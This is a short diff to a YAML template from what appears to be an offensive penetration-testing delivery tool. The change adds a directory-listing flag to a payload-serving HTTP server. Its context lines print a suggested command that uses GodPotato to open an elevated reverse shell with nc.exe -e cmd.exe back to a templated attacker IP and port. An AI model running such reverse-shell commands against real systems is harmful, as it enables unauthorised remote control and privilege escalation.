@@ -15,4 +15,4 @@ content: |
   echo '                      -Suggested Commands-                      '; \
   echo 'To open another revshell with elevated privileges: {{ delivery_path_windows }}\GodPotato.exe -cmd "{{ delivery_path_windows }}\nc.exe -e cmd.exe {{ attacker_ip }} {{ shell_port }}"'; \
   echo '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
